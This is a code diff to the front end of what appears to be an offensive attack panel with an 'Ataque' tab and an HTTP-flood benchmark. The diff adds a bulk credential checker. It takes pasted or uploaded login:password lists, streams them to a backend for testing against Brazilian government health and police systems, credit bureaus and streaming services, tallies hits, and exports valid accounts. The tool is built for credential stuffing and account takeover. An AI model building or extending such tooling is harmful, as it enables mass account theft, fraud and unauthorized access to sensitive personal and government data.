@@ -618,10 +618,28 @@ function Panel() {
   interface NodeHealth { url: string; online: boolean; latencyMs: number; cpus?: number; freeMem?: number; }
   const [nodeHealth, setNodeHealth] = useState<NodeHealth[]>([]);
 
+  /* Active page */
+  const [activePage, setActivePage] = useState<"attack" | "checker">("attack");
+
   /* Site checker */
   const [checkerUrl, setCheckerUrl] = useState("");
   const [checkerResult, setCheckerResult] = useState<CheckResult | null>(null);
   const [isChecking, setIsChecking] = useState(false);
+
+  /* ── Credential Bulk Checker ── */
+  type CredCheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp";
+  interface CredResult { credential: string; login: string; status: "HIT" | "FAIL" | "ERROR"; detail?: string; }
+  const [credTarget, setCredTarget]         = useState<CredCheckerTarget>("consultcenter");
+  const [credText, setCredText]             = useState("");
+  const [credRunning, setCredRunning]       = useState(false);
+  const [credTotal, setCredTotal]           = useState(0);
+  const [credDone, setCredDone]             = useState(0);
+  const [credHits, setCredHits]             = useState<CredResult[]>([]);
+  const [credFails, setCredFails]           = useState(0);
+  const [credErrors, setCredErrors]         = useState(0);
+  const [credRecent, setCredRecent]         = useState<CredResult[]>([]);
+  const credAbortRef                         = useRef<AbortController | null>(null);
+  const credFileRef                          = useRef<HTMLInputElement>(null);
 
   /* Analyzer */
   const [analyzeResult, setAnalyzeResult] = useState<AnalyzeResult | null>(null);
@@ -1443,6 +1461,114 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
     setIsChecking(false);
   }
 
+  /* ── Credential Bulk Checker helpers ── */
+  const CRED_TARGET_LABELS: Record<string, string> = {
+    iseek: "iSeek.pro", datasus: "DataSUS / SI-PNI", sipni: "SIPNI v2",
+    consultcenter: "ConsultCenter", mind7: "Mind-7", serpro: "SERPRO",
+    sisreg: "SISREG III", credilink: "CrediLink", serasa: "Serasa Empreendedor",
+    crunchyroll: "Crunchyroll", netflix: "Netflix", amazon: "Amazon Prime",
+    hbomax: "HBO Max", disney: "Disney+", paramount: "Paramount+",
+    sinesp: "SINESP Segurança", serasa_exp: "Serasa Experience",
+  };
+
+  function handleCredStop() {
+    credAbortRef.current?.abort();
+    setCredRunning(false);
+  }
+
+  async function handleCredStart() {
+    const lines = credText.split("\n").map(l => l.trim()).filter(Boolean);
+    if (!lines.length) { addLog("✕ Cole credenciais no formato login:senha", "error"); return; }
+
+    setCredRunning(true);
+    setCredTotal(lines.length);
+    setCredDone(0);
+    setCredHits([]);
+    setCredFails(0);
+    setCredErrors(0);
+    setCredRecent([]);
+
+    const ac = new AbortController();
+    credAbortRef.current = ac;
+
+    try {
+      const res = await fetch(`${BASE}/api/checker/stream`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ credentials: lines, target: credTarget }),
+        signal: ac.signal,
+      });
+
+      if (!res.ok || !res.body) {
+        addLog(`✕ Checker stream falhou: HTTP ${res.status}`, "error");
+        setCredRunning(false);
+        return;
+      }
+
+      const reader = res.body.getReader();
+      const decoder = new TextDecoder();
+      let buf = "";
+
+      while (true) {
+        const { done, value } = await reader.read();
+        if (done) break;
+        buf += decoder.decode(value, { stream: true });
+        const parts = buf.split("\n\n");
+        buf = parts.pop() ?? "";
+        for (const chunk of parts) {
+          const dataLine = chunk.split("\n").find(l => l.startsWith("data:"));
+          if (!dataLine) continue;
+          try {
+            const ev = JSON.parse(dataLine.slice(5).trim()) as {
+              type: string;
+              total?: number;
+              result?: { credential: string; login: string; status: string; detail?: string };
+            };
+            if (ev.type === "start" && ev.total) {
+              setCredTotal(ev.total);
+            } else if (ev.type === "result" && ev.result) {
+              const r = ev.result as { credential: string; login: string; status: "HIT" | "FAIL" | "ERROR"; detail?: string };
+              setCredDone(d => d + 1);
+              if (r.status === "HIT") {
+                setCredHits(prev => [r, ...prev]);
+              } else if (r.status === "FAIL") {
+                setCredFails(f => f + 1);
+              } else {
+                setCredErrors(e => e + 1);
+              }
+              setCredRecent(prev => [r, ...prev].slice(0, 50));
+            } else if (ev.type === "done") {
+              setCredRunning(false);
+            }
+          } catch { /**/ }
+        }
+      }
+    } catch (e) {
+      if ((e as Error).name !== "AbortError") addLog(`✕ Checker erro: ${String(e)}`, "error");
+    }
+    setCredRunning(false);
+  }
+
+  function handleCredFileUpload(e: React.ChangeEvent<HTMLInputElement>) {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = ev => setCredText((ev.target?.result as string) ?? "");
+    reader.readAsText(file);
+    e.target.value = "";
+  }
+
+  function exportCredHits() {
+    const text = credHits.map(h => `${h.credential}|${h.detail ?? ""}`).join("\n");
+    const blob = new Blob([text], { type: "text/plain" });
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement("a");
+    a.href     = url;
+    a.download = `hits_${credTarget}_${Date.now()}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+
   async function handleBenchmark() {
     addLog("👁 Benchmark mode: testing http-flood against httpbin.org (10s)...", "info");
     const testUrl = "http://httpbin.org";
@@ -1808,7 +1934,171 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
           >
             {theme === "lelouch" ? "⚔ Suzaku Mode" : "👁 Lelouch Mode"}
           </button>
+
+          {/* ── Page tabs ── */}
+          <div className="lb-page-tabs">
+            <button
+              className={`lb-page-tab ${activePage === "attack" ? "lb-page-tab--active" : ""}`}
+              onClick={() => setActivePage("attack")}
+            >
+              ⚔ Ataque
+            </button>
+            <button
+              className={`lb-page-tab ${activePage === "checker" ? "lb-page-tab--active" : ""}`}
+              onClick={() => setActivePage("checker")}
+            >
+              🔑 Credential Checker
+            </button>
+          </div>
         </header>
+
+        {/* ══════════════════════════════════════════════
+            CREDENTIAL CHECKER PAGE
+        ══════════════════════════════════════════════ */}
+        {activePage === "checker" && (
+          <div className="lb-cred-page">
+            {/* Target selector */}
+            <section className="lb-cred-section">
+              <h3 className="lb-section-title">🎯 Alvo</h3>
+              <div className="lb-cred-target-grid">
+                {(Object.keys(CRED_TARGET_LABELS) as (keyof typeof CRED_TARGET_LABELS)[]).map(k => (
+                  <button
+                    key={k}
+                    className={`lb-cred-target-btn ${credTarget === k ? "lb-cred-target-btn--active" : ""}`}
+                    onClick={() => setCredTarget(k as typeof credTarget)}
+                    disabled={credRunning}
+                  >
+                    {CRED_TARGET_LABELS[k]}
+                  </button>
+                ))}
+              </div>
+            </section>
+
+            {/* Credential input */}
+            <section className="lb-cred-section">
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+                <h3 className="lb-section-title">📋 Credenciais (login:senha por linha)</h3>
+                <div style={{ display: "flex", gap: 6 }}>
+                  <button
+                    className="lb-cred-mini-btn"
+                    onClick={() => setCredText("")}
+                    disabled={credRunning}
+                    title="Limpar"
+                  >✕ Limpar</button>
+                  <button
+                    className="lb-cred-mini-btn"
+                    onClick={() => credFileRef.current?.click()}
+                    disabled={credRunning}
+                    title="Carregar arquivo .txt"
+                  >📂 Arquivo</button>
+                  <input ref={credFileRef} type="file" accept=".txt,.csv" style={{ display: "none" }} onChange={handleCredFileUpload} />
+                </div>
+              </div>
+              <textarea
+                className="lb-cred-textarea"
+                placeholder={"user@email.com:senha123\noutro@email.com:outrasenha\n..."}
+                value={credText}
+                onChange={e => setCredText(e.target.value)}
+                disabled={credRunning}
+                spellCheck={false}
+              />
+              <div className="lb-cred-count-row">
+                <span className="lb-cred-count">
+                  {credText ? credText.split("\n").filter(l => l.trim()).length : 0} credenciais
+                </span>
+                <div style={{ display: "flex", gap: 8 }}>
+                  {!credRunning ? (
+                    <button
+                      className="lb-cred-start-btn"
+                      onClick={handleCredStart}
+                      disabled={!credText.trim()}
+                    >
+                      ▶ Iniciar Checker
+                    </button>
+                  ) : (
+                    <button className="lb-cred-stop-btn" onClick={handleCredStop}>
+                      ⏹ Parar
+                    </button>
+                  )}
+                </div>
+              </div>
+            </section>
+
+            {/* Progress bar */}
+            {(credRunning || credDone > 0) && (
+              <section className="lb-cred-section">
+                <div className="lb-cred-progress-header">
+                  <span className="lb-section-title">
+                    {credRunning ? "⚡ Rodando..." : "✅ Concluído"}
+                    &nbsp;— {CRED_TARGET_LABELS[credTarget]}
+                  </span>
+                  <span className="lb-cred-progress-nums">
+                    {credDone}/{credTotal}
+                  </span>
+                </div>
+                <div className="lb-cred-bar-outer">
+                  <div
+                    className="lb-cred-bar-inner"
+                    style={{ width: credTotal > 0 ? `${Math.round(credDone / credTotal * 100)}%` : "0%" }}
+                  />
+                </div>
+                <div className="lb-cred-stats-row">
+                  <span className="lb-cred-stat lb-cred-stat--hit">
+                    ✅ HITs: {credHits.length}
+                  </span>
+                  <span className="lb-cred-stat lb-cred-stat--fail">
+                    ❌ FAILs: {credFails}
+                  </span>
+                  <span className="lb-cred-stat lb-cred-stat--err">
+                    ⚠ Erros: {credErrors}
+                  </span>
+                  <span className="lb-cred-stat" style={{ marginLeft: "auto" }}>
+                    {credTotal > 0 ? Math.round(credDone / credTotal * 100) : 0}%
+                  </span>
+                </div>
+              </section>
+            )}
+
+            {/* HITs panel */}
+            {credHits.length > 0 && (
+              <section className="lb-cred-section lb-cred-hits-section">
+                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+                  <h3 className="lb-section-title">✅ HITs ({credHits.length})</h3>
+                  <button className="lb-cred-mini-btn lb-cred-mini-btn--gold" onClick={exportCredHits}>
+                    ⬇ Exportar HITs
+                  </button>
+                </div>
+                <div className="lb-cred-results-list">
+                  {credHits.map((r, i) => (
+                    <div key={i} className="lb-cred-row lb-cred-row--hit">
+                      <span className="lb-cred-row-badge">HIT</span>
+                      <span className="lb-cred-row-cred">{r.credential}</span>
+                      {r.detail && <span className="lb-cred-row-detail">{r.detail}</span>}
+                    </div>
+                  ))}
+                </div>
+              </section>
+            )}
+
+            {/* Recent results */}
+            {credRecent.length > 0 && (
+              <section className="lb-cred-section">
+                <h3 className="lb-section-title">🕒 Resultados Recentes</h3>
+                <div className="lb-cred-results-list">
+                  {credRecent.map((r, i) => (
+                    <div key={i} className={`lb-cred-row lb-cred-row--${r.status.toLowerCase()}`}>
+                      <span className="lb-cred-row-badge">{r.status}</span>
+                      <span className="lb-cred-row-cred">{r.credential}</span>
+                      {r.detail && <span className="lb-cred-row-detail">{r.detail}</span>}
+                    </div>
+                  ))}
+                </div>
+              </section>
+            )}
+          </div>
+        )}
+
+        {activePage === "attack" && <>
 
         {/* ── Built-in Presets ── */}
         <div className="lb-presets">
@@ -3033,6 +3323,9 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
           <img src={GEASS_SYMBOL} className="lb-footer-symbol" alt="" aria-hidden="true"/>
         </footer>
         <div className="lb-footer-bar"><div className="lb-footer-fill" style={{ width: `${progress}%` }}/></div>
+
+        </> /* end activePage === "attack" */}
+
       </div>
 
       {/* Mobile FAB */}
